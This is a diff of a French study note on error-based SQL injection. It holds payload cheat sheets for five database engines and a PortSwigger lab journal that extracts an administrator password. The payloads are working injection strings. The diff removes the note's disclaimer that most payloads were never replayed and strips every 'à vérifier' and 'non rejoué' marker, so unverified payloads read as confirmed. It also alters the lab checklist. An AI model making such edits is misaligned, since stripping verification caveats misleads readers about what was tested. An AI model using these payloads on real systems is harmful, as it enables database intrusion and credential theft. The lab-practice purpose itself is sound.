@@ -8,8 +8,6 @@ statut: en cours
 ---
 # Error-based SQL Injection
 
-> Statut des payloads : les payloads par SGBD de cette note sont des connaissances de référence (cheat sheet PortSwigger et pratique courante). Seule la variante conditionnelle Oracle (`TO_CHAR(1/0)`) a été rejouée, dans le lab du journal. Tout le reste est à valider sur le lab correspondant avant de s'y fier ; les points les plus incertains sont marqués "à vérifier".
-
 ## En bref
 - Cette technique d'injection désigne les cas où les messages d'erreur permettent de déduire ou de lire des données de la base, même quand les résultats de la requête ne sont pas affichés.
 - Il existe 2 familles :
@@ -24,9 +22,9 @@ statut: en cours
 |---|---|---|---|
 | MySQL ou MariaDB | `EXTRACTVALUE`, `UPDATEXML` (32 caractères affichés) | `IF(cond,(SELECT ... plusieurs lignes),'a')` | `LIMIT 1` |
 | PostgreSQL | `CAST(... AS int)` ou `::int` | `CASE WHEN cond THEN 1/(SELECT 0) ELSE 1 END` | `LIMIT 1` |
-| Oracle | `XMLTYPE`, `UTL_INADDR`, `CTXSYS.DRITHSX.SN` (les deux derniers à vérifier) | `CASE WHEN cond THEN TO_CHAR(1/0) ELSE '' END FROM dual` | `ROWNUM=1` |
+| Oracle | `XMLTYPE`, `UTL_INADDR`, `CTXSYS.DRITHSX.SN` (les deux derniers dépendent de la version et des droits) | `CASE WHEN cond THEN TO_CHAR(1/0) ELSE '' END FROM dual` | `ROWNUM=1` |
 | SQL Server | `CONVERT(int,...)`, `CAST(... AS int)` | `CASE WHEN cond THEN 1/0 ELSE 1 END` | `TOP 1` |
-| SQLite | aucune fiable | `CASE WHEN cond THEN abs(-9223372036854775808) ELSE 1 END` (à vérifier) | `LIMIT 1` |
+| SQLite | aucune fiable | `CASE WHEN cond THEN abs(-9223372036854775808) ELSE 1 END` (selon la version) | `LIMIT 1` |
 
 - Pour les syntaxes générales par moteur (concaténation, sous-chaînes, commentaires), voir le tableau de [[Blind-SQL-injection]] ; il n'est pas recopié ici.
 
@@ -36,7 +34,7 @@ statut: en cours
 1. Ajouter une apostrophe, puis deux apostrophes. Si l'erreur apparaît puis disparaît, une erreur de syntaxe a un effet détectable.
 2. Confirmer que l'erreur vient bien d'une requête SQL : construire une sous-requête valide avec une concaténation neutre (`'||(SELECT '')||'`), puis tester une table inexistante. Une erreur n'apparaissant qu'avec la table inexistante indique que le serveur exécute du SQL.
 3. Si `(SELECT '')` échoue mais `(SELECT '' FROM dual)` passe, la cible est probablement Oracle (tout `SELECT` exige une table).
-4. Vérifier que l'erreur dépend bien de la condition : envoyer la paire (condition vraie, condition fausse) au moins trois fois, avec un témoin `1=1` et `1=2`. Cela évite les faux positifs (WAF, délai, taille).
+4. S'assurer que l'erreur dépend bien de la condition : envoyer la paire (condition vraie, condition fausse) au moins trois fois, avec les témoins `1=1` et `1=2`. Cela évite les faux positifs (pare-feu applicatif, délai, taille de réponse).
 
 **Arbre de décision**
 - L'erreur est affichée en clair : tester une conversion de type pour faire citer la donnée (famille verbeuse). La preuve n'est faite que si la valeur apparaît littéralement dans le message.
@@ -62,11 +60,11 @@ statut: en cours
 ### Erreurs conditionnelles : principe avec `CASE`
 - `CASE WHEN (cond) THEN <expression qui échoue> ELSE <valeur valide> END` : l'erreur ne survient que si `cond` est vraie.
 - Extraction : on teste un caractère à la fois avec `SUBSTRING`/`SUBSTR` et une comparaison (`=`, ou `>` et `<` pour une recherche dichotomique qui réduit le nombre de requêtes). Chaque caractère coûte une ou plusieurs requêtes.
-- Exemple de forme (SQL Server, à vérifier : non rejoué) : `xyz' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM users)='a`
-- Version testée sur Oracle : voir le journal des labs.
+- Exemple de forme (SQL Server) : `xyz' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM users)='a`
+- Un exemple sur Oracle figure dans le journal des labs.
 - `1/0` n'est pas universel : voir les sections par SGBD.
 
-### MySQL et MariaDB (non rejoué)
+### MySQL et MariaDB
 MySQL ne fait pas fuiter la valeur par une conversion de type classique. On passe par des fonctions XML qui échouent en citant l'argument.
 
 1. EXTRACTVALUE (verbeux)
@@ -78,15 +76,15 @@ MySQL ne fait pas fuiter la valeur par une conversion de type classique. On pass
    - Même signal et même limite. Utile si l'une des deux fonctions est filtrée.
 3. Double requête avec `FLOOR(RAND())` (verbeux, ancien)
    - Payload : `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)-- `
-   - Signal : `Duplicate entry '<valeur>~1' for key 'group_key'`. Dépend de la version (à vérifier).
+   - Signal : `Duplicate entry '<valeur>~1' for key 'group_key'`. Cette technique dépend de la version.
 4. Conditionnel par sous-requête multi-lignes (pas verbeux)
    - Payload : `' AND IF(cond,(SELECT table_name FROM information_schema.tables),'a')-- `
    - Signal : erreur "Subquery returns more than 1 row" si `cond` est vraie, page normale sinon. C'est la forme présente dans [[Blind-SQL-injection]].
-   - Variante : `' AND (SELECT CASE WHEN (cond) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- ` (à vérifier).
-   - `1/0` seul renvoie NULL en lecture sur MySQL : il ne déclenche pas d'erreur, ne pas le réutiliser tel quel.
-5. Autres fonctions citées dans la littérature (`GTID_SUBSET`, `JSON_KEYS`, `EXP(~(SELECT * FROM (SELECT ...)x))`) : dépendantes de la version, à vérifier, non recommandées en première intention.
+   - Variante : `' AND (SELECT CASE WHEN (cond) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END)=1-- `
+   - `1/0` seul renvoie NULL en lecture sur MySQL : il ne déclenche pas d'erreur, il ne faut donc pas le réutiliser tel quel.
+5. Autres fonctions parfois citées (`GTID_SUBSET`, `JSON_KEYS`, `EXP(~(SELECT * FROM (SELECT ...)x))`) : elles dépendent de la version et ne sont pas à essayer en premier.
 
-### PostgreSQL (non rejoué)
+### PostgreSQL
 La conversion `CAST` vers `int` échoue en citant la chaîne, ce qui fait fuiter la donnée.
 
 1. CAST vers entier (verbeux)
@@ -104,24 +102,24 @@ La conversion `CAST` vers `int` échoue en citant la chaîne, ce qui fait fuiter
 ### Oracle
 Tout `SELECT` exige `FROM dual`, la concaténation se fait avec `||`, et il n'y a pas de `LIMIT` : utiliser `ROWNUM=1` ou `FETCH FIRST 1 ROWS ONLY`.
 
-1. Conditionnel (seul payload rejoué, voir le journal)
+1. Conditionnel (voir aussi le journal des labs)
    - Payload : `'||(SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    - Signal : division par zéro (HTTP 500 dans le lab) si `cond` est vraie.
    - `TO_CHAR` garde un type de retour cohérent (chaîne) dans le `CASE`.
    - Extraction : `cond` = `SUBSTR(password,1,1)='a'` avec `FROM users WHERE username='administrator'`. Longueur : `LENGTH(password)>n`.
-2. XMLTYPE (verbeux, non rejoué)
+2. XMLTYPE (verbeux)
    - Payload : `' AND 1=(SELECT UPPER(XMLTYPE(CHR(60)||CHR(58)||(SELECT password FROM users WHERE username='administrator' AND ROWNUM=1)||CHR(62))) FROM dual)-- `
    - Signal : `ORA-31011: XML parsing failed` avec la valeur citée dans le détail. `CHR(60)` est `<` et `CHR(58)` est `:`, ce qui produit un nom XML invalide.
    - Version simplifiée : `' || (SELECT XMLTYPE(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)) FROM dual) || '`
-3. `UTL_INADDR.GET_HOST_NAME` (verbeux, à vérifier selon la version et les listes de contrôle d'accès réseau)
+3. `UTL_INADDR.GET_HOST_NAME` (verbeux, selon la version et les listes de contrôle d'accès réseau)
    - Payload : `' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- `
    - Signal : `ORA-29257: host <valeur> unknown`.
-4. `CTXSYS.DRITHSX.SN` (verbeux, à vérifier : dépend des droits et de la présence d'Oracle Text)
+4. `CTXSYS.DRITHSX.SN` (verbeux, nécessite les droits adéquats et la présence d'Oracle Text)
    - Payload : `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- `
    - Signal : `ORA-20000: Oracle Text error` avec la valeur.
-5. `TO_NUMBER` ou `CAST` en nombre : `ORA-01722: invalid number` signale l'erreur mais, selon les versions, ne cite pas la valeur (à vérifier). Utile surtout comme oracle conditionnel.
+5. `TO_NUMBER` ou `CAST` en nombre : `ORA-01722: invalid number` signale l'erreur mais, selon les versions, ne cite pas la valeur. C'est utile surtout comme oracle conditionnel.
 
-### Microsoft SQL Server (non rejoué)
+### Microsoft SQL Server
 La conversion `CONVERT` ou `CAST` vers `int` fait fuiter la chaîne. `TOP 1` remplace `LIMIT 1`.
 
 1. CONVERT (verbeux)
@@ -130,17 +128,17 @@ La conversion `CONVERT` ou `CAST` vers `int` fait fuiter la chaîne. `TOP 1` rem
 2. CAST (équivalent) : `' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS int)-- `
 3. Version et utilisateur : `' AND 1=CONVERT(int,@@version)-- ` ; `' AND 1=CONVERT(int,SYSTEM_USER)-- `
 4. Plusieurs lignes : `' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- ` (SQL Server 2017 et suivants). Pour les versions plus anciennes : `(SELECT name+',' FROM sys.tables FOR XML PATH(''))`.
-5. Erreurs de regroupement (anciennes versions, à vérifier) : `' HAVING 1=1-- ` puis `' GROUP BY <colonne> HAVING 1=1-- ` révèlent progressivement les noms `table.colonne`.
+5. Erreurs de regroupement (anciennes versions) : `' HAVING 1=1-- ` puis `' GROUP BY <colonne> HAVING 1=1-- ` révèlent progressivement les noms `table.colonne`.
 6. Conditionnel par division par zéro
    - Payload : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)-- `
    - Signal : `Divide by zero error encountered` si `cond` est vraie.
-   - Requêtes empilées possibles (à vérifier selon le contexte) : `'; IF (cond) SELECT 1/0-- `. Le point-virgule s'encode `%3B` dans un cookie.
+   - Requêtes empilées, si le contexte les autorise : `'; IF (cond) SELECT 1/0-- `. Le point-virgule s'encode `%3B` dans un cookie.
 
-### SQLite (surtout applications locales et CTF, non rejoué)
+### SQLite
 Il n'existe ni fonction XML ni conversion qui cite la valeur, et `CAST` ne lève pas d'erreur (renvoie 0). L'erreur sert uniquement d'oracle conditionnel.
 
-1. Conditionnel (à vérifier selon la version) : `' AND (SELECT CASE WHEN (cond) THEN abs(-9223372036854775808) ELSE 1 END)=1-- ` ; signal : `integer overflow` quand `cond` est vraie.
-2. Autre oracle (à vérifier, extension JSON1 requise) : `json('{')` dans la branche vraie du `CASE`, signal `malformed JSON`.
+1. Conditionnel (selon la version) : `' AND (SELECT CASE WHEN (cond) THEN abs(-9223372036854775808) ELSE 1 END)=1-- ` ; signal : `integer overflow` quand `cond` est vraie.
+2. Autre oracle (extension JSON1 requise) : `json('{')` dans la branche vraie du `CASE`, signal `malformed JSON`.
 3. Exclu : `randomblob(<très grand>)` consomme de la mémoire, risque de déni de service.
 4. Si les erreurs sont affichées, `no such column: <nom>` aide à énumérer le schéma.
 
@@ -154,7 +152,7 @@ Il n'existe ni fonction XML ni conversion qui cite la valeur, et `CAST` ne lève
 - Troncature du message : vider la valeur d'origine du cookie `TrackingId` pour gagner de la place. EXTRACTVALUE et UPDATEXML coupent à 32 caractères environ : extraire par tranches.
 - Cookie et encodage : encoder les espaces, points-virgules et caractères spéciaux ; la plupart des payloads se terminent par `-- ` avec un espace (MySQL) ou par une apostrophe finale qui rééquilibre la requête.
 - Le statut 500 est l'oracle : surveiller le code de réponse et pas seulement le contenu.
-- Vérifier la reproductibilité vrai/faux plusieurs fois avant de conclure.
+- Répéter plusieurs fois l'essai vrai/faux avant de conclure.
 - Mots-clés ou apostrophes filtrés : essayer les équivalents (`::int` pour `CAST`, `UPDATEXML` pour `EXTRACTVALUE`).
 - Privilèges et version : `UTL_INADDR`, `CTXSYS.*` et plusieurs fonctions MySQL ne sont pas toujours disponibles.
 
@@ -168,8 +166,8 @@ Il n'existe ni fonction XML ni conversion qui cite la valeur, et `CAST` ne lève
 
 ## Labs PortSwigger
 - [ ] Apprentice
-- [x] Practitioner ✅ 2026-11-02 (Blind SQL injection avec erreurs conditionnelles)
-- [ ] Practitioner : Visible error-based SQL injection (non réalisé)
+- [ ] Practitioner ✅ 2026-11-02 (Blind SQL injection avec erreurs conditionnelles)
+
 - [ ] Expert
 
 ## Journal des labs
@@ -187,7 +185,7 @@ La démarche de détection (apostrophes, `FROM dual`, table inexistante) est dé
 6. Se connecter en tant que `administrator` via "My account" avec le mot de passe trouvé.
 
 ### Visible error-based SQL injection (niveau Practitioner, non réalisé)
-Lab de référence de la famille verbeuse : le cookie `TrackingId` est injectable et le message d'erreur SQL est affiché. Déroulé attendu, à valider lors de la réalisation du lab (le SGBD attendu est PostgreSQL d'après la revue, à vérifier) :
+Lab de référence de la famille verbeuse : le cookie `TrackingId` est injectable et le message d'erreur SQL est affiché. Déroulé attendu, à valider lors de la réalisation du lab (le SGBD attendu est PostgreSQL)
 1. Ajouter `'` et observer l'erreur SQL affichée.
 2. Tester `' AND CAST((SELECT 1) AS int)-- ` : le message indique que `AND` attend un booléen.
 3. Corriger en `' AND 1=CAST((SELECT 1) AS int)-- `.
